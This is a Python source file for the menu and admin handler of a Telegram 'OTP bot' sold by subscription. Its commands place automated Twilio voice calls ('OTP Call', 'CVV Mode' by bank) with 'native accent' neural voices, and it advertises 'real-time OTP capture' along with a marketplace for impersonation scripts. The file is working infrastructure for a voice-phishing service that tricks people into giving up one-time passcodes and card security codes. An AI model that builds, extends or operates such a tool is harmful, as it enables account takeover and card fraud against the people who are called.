import os
import secrets
import platform
from datetime import datetime
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from twilio.rest import Client
from config import bot, ADMIN_IDS, TWILIO_SID, TWILIO_TOKEN
from database import get_connection, check_subscription
from handlers.keys import process_key_step
from handlers.payments import create_hoodpay_payment
from handlers.profile import get_profile_content, show_referral

# Versión del Sistema
VERSION = "v4.0 (Market UI Edition)"

@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    user_id = call.from_user.id
    
    # ⚠️ Ignorar callbacks de Live Panel (se manejan en live.py)
    if call.data.startswith("live_"): return

    # ==========================================
    # 🔙 MENÚ PRINCIPAL (HOME)
    # ==========================================
    if call.data == "back_home":
        text = f"BIGFATOTP - 𝙊𝙏𝙋 𝘽𝙊𝙏\nHello, {call.from_user.first_name}!\n\nSelect an option below:"
        
        markup = InlineKeyboardMarkup(row_width=2)
        markup.add(
            InlineKeyboardButton("🎟️ Enter Key", callback_data="enter_key"),
            InlineKeyboardButton("👤 Profile", callback_data="show_profile"),
            InlineKeyboardButton("🪙 ₿uy Plan", callback_data="buy_subs"),
            # 👇 NUEVO BOTÓN DE MERCADO 👇
            InlineKeyboardButton("🛒 Market & Scripts", callback_data="market_home"), 
            InlineKeyboardButton("🤖 Commands", callback_data="commands"),
            InlineKeyboardButton("🛠️ Features", callback_data="features"),
            InlineKeyboardButton("🫂 Community", callback_data="community"),
            InlineKeyboardButton("👥 Referral", callback_data="referral"),
            InlineKeyboardButton("⛑️ Support", callback_data="support")
        )
        if user_id in ADMIN_IDS:
            markup.add(InlineKeyboardButton("🕴️ 𝗔𝗗𝗠𝗜𝗡 𝗣𝗔𝗡𝗘𝗟", callback_data="admin_panel"))
            
        try:
            bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup)
        except:
            bot.send_message(call.message.chat.id, text, reply_markup=markup)

    # ==========================================
    # 🛒 MARKETPLACE MENU (NUEVO)
    # ==========================================
    elif call.data == "market_home":
        text = "🛒 **SCRIPT MARKETPLACE**\n\nManage your scripts or buy new ones from the store.\n\nSelect an option:"
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("📂 My Scripts", callback_data="show_myscripts"))
        markup.add(InlineKeyboardButton("📚 Free Library", callback_data="show_freescripts"))
        markup.add(InlineKeyboardButton("💎 Premium Shop", callback_data="show_shop"))
        markup.add(InlineKeyboardButton("⬅ Back", callback_data="back_home"))
        
        bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")

    elif call.data == "show_myscripts":
        conn = get_connection()
        cur = conn.cursor()
        cur.execute("SELECT service_name, language FROM otp_scripts WHERE user_id = %s", (user_id,))
        scripts = cur.fetchall()
        conn.close()
        
        if not scripts:
            msg = "📂 **MY SCRIPTS**\n\nYou don't have custom scripts.\nUse `/setscript` to create one or visit the Shop."
        else:
            msg = "📂 **MY SCRIPTS**\n\n"
            for s in scripts:
                msg += f"🔹 `{s[0]}` ({s[1]})\n"
            msg += "\n_To delete: /delscript [service]_"
            
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("⬅ Back to Market", callback_data="market_home"))
        bot.edit_message_text(msg, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")

    elif call.data == "show_freescripts":
        conn = get_connection()
        cur = conn.cursor()
        cur.execute("SELECT id, title, service_name, language FROM otp_market WHERE price = 0 OR is_premium = FALSE")
        scripts = cur.fetchall()
        conn.close()

        if not scripts:
            msg = "📚 **FREE LIBRARY**\n\nNo free scripts available right now."
        else:
            msg = "📚 **FREE LIBRARY**\n\n"
            for s in scripts:
                msg += f"🆔 `{s[0]}` | **{s[1]}** ({s[2]})\n"
            msg += "\n⬇️ **To Install:** Type `/getscript [ID]`"

        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("⬅ Back to Market", callback_data="market_home"))
        bot.edit_message_text(msg, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")

    elif call.data == "show_shop":
        conn = get_connection()
        cur = conn.cursor()
        cur.execute("SELECT id, title, price, language FROM otp_market WHERE is_premium = TRUE")
        items = cur.fetchall()
        conn.close()
        
        if not items:
            msg = "💎 **PREMIUM SHOP**\n\nNo items for sale right now."
        else:
            msg = "💎 **PREMIUM SHOP**\n\n"
            for item in items:
                msg += f"🆔 `{item[0]}` | **{item[1]}**\n💰 Price: `${item[2]}`\n🗣 Lang: {item[3]}\n➖➖➖➖➖\n"
            msg += "\n🛒 **To Buy:** Type `/confirmbuy [ID]`\n👁 **Preview:** Type `/previewscript [ID]` (Admin)"

        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("⬅ Back to Market", callback_data="market_home"))
        bot.edit_message_text(msg, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")

    # ==========================================
    # 👤 PERFIL Y REFERIDOS
    # ==========================================
    elif call.data == "show_profile":
        text, markup = get_profile_content(user_id, call.from_user.first_name)
        if text:
            bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
        else:
            bot.answer_callback_query(call.id, "⚠️ Profile not found. Type /start", show_alert=True)

    elif call.data == "referral":
        bot.delete_message(call.message.chat.id, call.message.message_id)
        call.message.from_user = call.from_user
        show_referral(call.message)

    # ==========================================
    # 🫂 COMMUNITY
    # ==========================================
    elif call.data == "community":
        text = """
🫂 **OFFICIAL COMMUNITY**

Join our channel for:
• New Updates & Features
• Server Status
• Giveaways
• Chat with other users

👉 **Click below to join:**
        """
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("🚀 Join Channel", url="https://t.me/TuCanalAqui"))
        markup.add(InlineKeyboardButton("💬 Join Chat Group", url="https://t.me/TuGrupoAqui"))
        markup.add(InlineKeyboardButton("⬅ Back", callback_data="back_home"))
        
        bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")

    # ==========================================
    # 🕴️ ADMIN PANEL (DASHBOARD)
    # ==========================================
    elif call.data == "admin_panel":
        if user_id in ADMIN_IDS:
            markup = InlineKeyboardMarkup()
            markup.row(InlineKeyboardButton("🔑 1 Day", callback_data="gen_1"), InlineKeyboardButton("🔑 1 Week", callback_data="gen_7"))
            markup.row(InlineKeyboardButton("📜 Bot Logs", callback_data="show_log"), InlineKeyboardButton("ℹ️ System Info", callback_data="show_version"))
            markup.row(InlineKeyboardButton("📡 Balance", callback_data="admin_twilio"), InlineKeyboardButton("🐞 Twilio Debug", callback_data="twilio_debug"))
            markup.add(InlineKeyboardButton("⬅ Back to Menu", callback_data="back_home"))
            
            bot.edit_message_text("🕴️ **ADMIN DASHBOARD**", call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
        else:
            bot.answer_callback_query(call.id, "⛔ Access Denied")

    # ==========================================
    # 📡 ADMIN TWILIO CHECKER
    # ==========================================
    elif call.data == "admin_twilio":
        if user_id not in ADMIN_IDS: return

        bot.answer_callback_query(call.id, "🔄 Fetching Balance...")
        try:
            client = Client(TWILIO_SID, TWILIO_TOKEN)
            try:
                balance_data = client.api.v2010.accounts(TWILIO_SID).balance.fetch()
                balance = f"{balance_data.balance} {balance_data.currency}"
            except:
                balance = "Unknown"

            account = client.api.v2010.accounts(TWILIO_SID).fetch()
            status = account.status.upper()
            type_acc = account.type.upper()

            info_msg = f"📡 **TWILIO STATUS**\n━━━━━━━━\n💰 **Balance:** `{balance}`\n📊 **Status:** {status}\n🏷 **Type:** {type_acc}"
            
            markup = InlineKeyboardMarkup()
            markup.add(InlineKeyboardButton("⬅ Back", callback_data="admin_panel"))
            bot.edit_message_text(info_msg, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")

        except Exception as e:
            bot.edit_message_text(f"❌ API Error: {e}", call.message.chat.id, call.message.message_id)

    # ==========================================
    # 🐞 TWILIO DEBUGGER (Last 20)
    # ==========================================
    elif call.data == "twilio_debug":
        if user_id not in ADMIN_IDS: return
        
        bot.answer_callback_query(call.id, "🔄 Fetching last 20 logs...")
        
        try:
            client = Client(TWILIO_SID, TWILIO_TOKEN)
            calls = client.calls.list(limit=20)
            calls_msg = ""
            if calls:
                for c in calls:
                    if c.status == 'completed': icon = "✅"
                    elif c.status in ['busy', 'no-answer', 'failed', 'canceled']: icon = "❌"
                    elif c.status in ['ringing', 'in-progress', 'queued']: icon = "📞"
                    else: icon = "❓"
                    to_num = c.to[-4:] if c.to else "Unk"
                    dur = c.duration if c.duration else "0"
                    calls_msg += f"{icon} `...{to_num}` | {c.status} ({dur}s)\n"
            else:
                calls_msg = "No recent calls found."

            alerts = client.monitor.v1.alerts.list(limit=5)
            alerts_msg = ""
            if alerts:
                for a in alerts:
                    txt = a.alert_text if a.alert_text else "No details"
                    alerts_msg += f"🔴 **Err {a.error_code}:** _{txt[:40]}..._\n"
            else:
                alerts_msg = "✅ No recent critical errors."

            now_str = datetime.now().strftime("%H:%M:%S")
            full_msg = f"🐞 **TWILIO DEBUGGER (Last 20)**\n━━━━━━━━━━━━━━━━━━━━\n📞 **Recent Calls:**\n{calls_msg}\n⚠️ **Recent Alerts (Last 5):**\n{alerts_msg}\n_Last Update: {now_str}_"
            
            markup = InlineKeyboardMarkup()
            markup.add(InlineKeyboardButton("🔄 Refresh", callback_data="twilio_debug"))
            markup.add(InlineKeyboardButton("⬅ Back", callback_data="admin_panel"))
            
            bot.edit_message_text(full_msg, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")

        except Exception as e:
            if "message is not modified" in str(e):
                bot.answer_callback_query(call.id, "✅ Already up to date!")
            else:
                bot.edit_message_text(f"❌ Error: {e}", call.message.chat.id, call.message.message_id)

    # ==========================================
    # 📜 ADMIN LOGS
    # ==========================================
    elif call.data == "show_log":
        if user_id not in ADMIN_IDS: return
        try:
            if os.path.exists("bot.log"):
                with open("bot.log", "r") as f:
                    lines = f.readlines()
                    last_lines = "".join(lines[-15:])
                now_str = datetime.now().strftime("%H:%M:%S")
                log_text = f"📜 **SYSTEM LOGS:**\n\n```\n{last_lines}```\n_Refreshed: {now_str}_"
            else:
                log_text = "⚠️ **Log file not found.**"

            markup = InlineKeyboardMarkup()
            markup.add(InlineKeyboardButton("🔄 Refresh", callback_data="show_log"))
            markup.add(InlineKeyboardButton("⬅ Back", callback_data="admin_panel"))
            bot.edit_message_text(log_text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
        except: pass

    # ==========================================
    # ℹ️ SYSTEM INFO / VERSION
    # ==========================================
    elif call.data == "show_version":
        if user_id not in ADMIN_IDS: return
        sys_info = f"Python {platform.python_version()} on {platform.system()}"
        text = f"ℹ️ **SYSTEM INFO**\n━━━━━━━━\n🤖 **Ver:** `{VERSION}`\n🐍 **Env:** {sys_info}\n📡 **Server:** Render Cloud"
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("⬅ Back", callback_data="admin_panel"))
        bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")

    # ==========================================
    # 🔑 GENERAR KEYS
    # ==========================================
    elif call.data.startswith("gen_"):
        if user_id not in ADMIN_IDS: return
        days = int(call.data.split("_")[1])
        new_key = f"KEY-{secrets.token_hex(4).upper()}"
        conn = get_connection()
        cur = conn.cursor()
        cur.execute("INSERT INTO otp_licenses (key_code, duration_days) VALUES (%s, %s)", (new_key, days))
        conn.commit()
        conn.close()
        
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("⬅ Back to Admin", callback_data="admin_panel"))
        bot.edit_message_text(f"✅ **Key Created!**\nCode: `{new_key}`\nDays: {days}", call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")

    # ==========================================
    # ℹ️ COMMANDS & FEATURES
    # ==========================================
    elif call.data == "commands":
        text = """
🤖 **COMMANDS LIST**

👤 **User:**
`/start` - Main Menu
`/profile` - Check Credits
`/call [number] [service]` - OTP Call
`/sms [number] [service]` - SMS Warning
`/cvv [number] [bank]` - CVV Mode

🛒 **Market & Scripts:**
`/myscripts` - View installed scripts
`/freescripts` - Free Library
`/buyscript` - Premium Shop
`/setscript` - Create Custom Script

👮‍♂️ **Admin:**
`/create [days]` - Gen Key
`/addbalance [id] [amount]` - Add Credit
`/addmarket` - Add item to shop
        """
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("⬅ Back", callback_data="back_home"))
        bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
    
    elif call.data == "features":
        text = "🛠️ **FEATURES**\n\n• **Neural Voice:** Native accents.\n• **Marketplace:** Buy/Sell scripts.\n• **Live Panel:** Real-time OTP capture.\n• **Wallet:** Credit system."
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("⬅ Back", callback_data="back_home"))
        bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")

    elif call.data == "support":
        text = "⛑️ **SUPPORT**\n\nContact: @MatthewOwner"
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("⬅ Back", callback_data="back_home"))
        bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")

    elif call.data == "bot_status":
        bot.answer_callback_query(call.id, "✅ Systems Online", show_alert=True)

    # ==========================================
    # 💳 PAGOS Y KEYS
    # ==========================================
    elif call.data == "enter_key":
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("❌ Cancel", callback_data="back_home"))
        msg = bot.send_message(call.message.chat.id, "🎟️ **Send Key:**", reply_markup=markup)
        bot.register_next_step_handler(msg, process_key_step)

    elif call.data == "buy_subs":
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("📅 1 Day ($50)", callback_data="pay_daily"))
        markup.add(InlineKeyboardButton("🗓 1 Week ($150)", callback_data="pay_weekly"))
        markup.add(InlineKeyboardButton("📆 1 Month ($285)", callback_data="pay_monthly"))
        markup.add(InlineKeyboardButton("⬅ Back", callback_data="back_home"))
        bot.edit_message_text("💳 **Select Plan:**", call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")

    elif call.data in ["pay_daily", "pay_weekly", "pay_monthly", "pay_dev_test"]:
        plan = call.data.split("_")[1]
        if "dev" in call.data: plan = "dev_test"
        create_hoodpay_payment(call.message.chat.id, plan)
        
    else:
        bot.answer_callback_query(call.id, "Coming soon")